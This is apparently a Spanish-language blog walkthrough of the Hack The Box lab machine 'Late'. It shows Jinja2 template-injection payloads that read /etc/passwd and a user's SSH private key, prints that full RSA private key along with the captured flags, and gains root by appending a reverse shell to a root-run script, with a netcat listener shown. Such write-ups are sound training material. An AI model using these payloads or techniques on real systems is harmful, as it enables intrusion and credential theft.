---
layout: single
title: Hack The Box - Late
excerpt: "Late es una máquina de HTB de dificultad fácil mediante la cual se explota la vulnerabilidad Server Side Template Injection (SSTI) mediante la carga de imágenes en un sitio web que debe identificarse previamente, para la escalación de privilegios se tocan temas como enumeración de procesos, permisos y atributos de archivos."
date: 2023-02-27
classes: wide
header:
  teaser: /assets/images/htb-writeup-late/late.webp
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Web Pentesting
tags:  
  - SSTI
  - jinja
  - pspy
  - lsattr
  - bash
---


<style>
body
{
  margin: 0;
  padding: 0;
}

.glitch
  {
    position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-late/late.webp");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
 }

.glitch:before
  {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-late/late.webp");
    background-size: cover; /* contain for split effect */
    opacity: .5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

.glitch:hover:before
{
  animation: glitch1 1s linear infinite;
}

@keyframes glitch1
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 5px 0;
  }
  20%
  {
    background-position: -5px 0;
  }
  30%
  {
    background-position: 15px 0;
  }
  40%
  {
    background-position: -5px 0;
  }
  50%
  {
    background-position: -25px 0;
  }
  60%
  {
    background-position: -50px 0;
  }
  70%
  {
    background-position: 0 -20px;
  }
  80%
  {
    background-position: -60px -20px;
  }
  81%
  {
    background-position: 0 0;
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(360deg);
  }
}

@keyframes glitch2
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 15px 0;
  }
  15%
  {
    background-position: -15px 0;
  }
  20%
  {
    filter: hue-rotate(360deg);
  }
  25%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
}

@media (max-width: 767.5px) {

.glitch{
position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-late/late.webp");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


@media (max-width: 575.5px) { 

.glitch{
position: relative;
    width: 50%;
    height: 25vh;
    background-image:url("/assets/images/htb-writeup-late/late.webp");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


</style>
<body>
    <div class="glitch">  
    </div>
</body>

<br>

Late es una máquina de HTB de dificultad fácil mediante la cual se explota la vulnerabilidad Server Side Template Injection (SSTI) mediante la carga de imágenes en un sitio web que debe identificarse previamente, para la escalación de privilegios se tocan temas como enumeración de procesos, permisos y atributos de archivos.
## Enumeración
Realizando un escaneo de puertos con la herramienta nmap identifiqué solamente 2 puertos abiertos:<br>
- 22 SSH
- 80 HTTP 

![](/assets/images/htb-writeup-late/nmap_scan.png)

## Enumeración Web

El sitio web que tiene alojado la máquina es el siguiente: <br>

![](/assets/images/htb-writeup-late/website.png)

Para obtener más información acerca de las tecnologías empleadas en el sitio web utilicé la herramienta **whatweb**.
<br>
```bash
┌──(root㉿kali)-[/home/…/Documents/HTB/Late/content]
└─# whatweb http://10.10.11.156/                                                                          
http://10.10.11.156/ [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[#,support@late.htb], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.156], JQuery[1.10.2], Meta-Author[Sergey Pozhilov (GetTemplate.com)], Script, Title[Late - Best online image tools], nginx[1.14.0]
```
Como información relevante obtenida mediante la consulta anterior identifique un posible dominio **late.htb**, adicionalmente navegando en el sitio web como un usuario común identifique otro posible subdominio **images.late.htb** en la sección editor de fotos en línea gratis lo que hace pensar que se esté utilizando virtual hosting es decir que se están alojando diferentes dominios y sitios web en la misma máquina, para poder comprobarlo agregue ambos dominios en mi archivo /etc/hosts apuntando a la ip de la máquina víctima y al consultar el segundo dominio mostró un sitio web diferente.

```bash
┌──(root㉿kali)-[/home/…/Documents/HTB/Late/content]
└─# cat /etc/hosts                                                               
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.156    late.htb images.late.htb
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

![](/assets/images/htb-writeup-late/images.png)

## Server Side Template Injection (SSTI)

El nuevo sitio web permite convertir imágenes en texto y menciona el uso de flask, un framework basado en Python por lo cual es posible que sea vulnerable a STTI “Server Side Template Injection” para poder corroborarlo subí una foto con el contenido: \{\{7 x 7\}\} y como resultado obtuve 49 es decir que logra interpretarse lo cual demuestra que es potencialmente vulnerable.

<img  src="/assets/images/htb-writeup-late/siete.png" style="width:50%; display: block; margin-left: auto;  margin-right: auto;">

```bash
 ┌──(root㉿kali)-[/home/…/Documents/HTB/Late/content]
└─# cat /home/kali/Downloads/results.txt 
<p>49
</p>                                                                                                                              
``` 
Posteriormente subí otra imagen con la siguiente instrucción para poder leer archivos de la máquina, en este caso el /etc/passwd: <br>
**\{\{ get\_flashed\_messages.\_\_globals\_\_.\__builtins\_\_\.open\(\"/etc/passwd\"\).read\(\) }\}**

![](/assets/images/htb-writeup-late/etc_pass.png)

Ahora que ya conozco que usuarios existen en la máquina, utilice la misma instrucción anterior para leer archivos pero en este caso buscando la llave privada de ssh del usuario svc_acc <br>
**\{\{ get\_flashed\_messages.\_\_globals\_\_.\__builtins\_\_\.open\(\"/home/svc_acc/.ssh/id_rsa\"\).read\(\) }\}**

``` bash
┌──(root㉿kali)-[/home/…/Documents/HTB/Late/content]
└─# cat id_rsa                   
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
``` 
Ya que cuento con la llave privada del usuario puedo ganar acceso a la máquina y visualizar la bandera de usuario.

``` bash
┌──(root㉿kali)-[/home/…/Documents/HTB/Late/content]
└─# ssh -i id_rsa svc_acc@10.10.11.156
svc_acc@late:~$ whoami
svc_acc
svc_acc@late:~$ cat user.txt 
bb90b2ed928c854c77e1ee2bd3e1087a
svc_acc@late:~$ 
``` 

## Escalada de privilegios

Utilizando linpeas identifiqué un script interesante **“/usr/local/sbin/ssh-alert.sh”** el cual cuenta con permisos de escritura:

``` bash
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
```   
Analizando el script me di cuenta de que envía información sobre cada inicio de sesión mediante SSH, con ayuda del script pspy64 para monitorear los procesos que se ejecutan en la máquina víctima e iniciando sesión nuevamente mediante SSH pude ver que el script **ssh-alert.sh** es ejecutado por el usuario root.

![](/assets/images/htb-writeup-late/pspy.png)

Sin embargo aunque se tiene permisos de escritura en el script al intentar modificarlo se obtiene un error así que revisando los atributos del archivo con el comando **lsattr** pude ver que tiene establecido el atributo **a**, este atributo dice que solo se puede agregar texto.

``` bash
svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh 
-----a--------e--- /usr/local/sbin/ssh-alert.sh
svc_acc@late:~$
```

```bash
ATTRIBUTES
       a      A file with the 'a' attribute set can only be opened in append mode for writing.  Only the  superuser  or  a
              process possessing the CAP_LINUX_IMMUTABLE capability can set or clear this attribute.
```

![](/assets/images/htb-writeup-late/error.png)

Para poder agregar texto al script primero cree un archivo con una reverse Shell básica como contenido, posteriormente le di un cat a mi archivo y redireccione la salida al script para poder agregarla. 

![](/assets/images/htb-writeup-late/shell.png)

Por último coloque mi listener con netcat e inicie sesión nuevamente mediante SSH para poder obtener una Shell como el usuario root.

``` bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 443      
listening on [any] 443 ...
connect to [10.10.14.7] from late.htb [10.10.11.156] 36436
bash: cannot set terminal process group (2316): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/# whoami
whoami
root
root@late:/# cat /root/root.txt
cat /root/root.txt
b97fada8115f1c0862861d60c8416d88
root@late:/# 
``` 
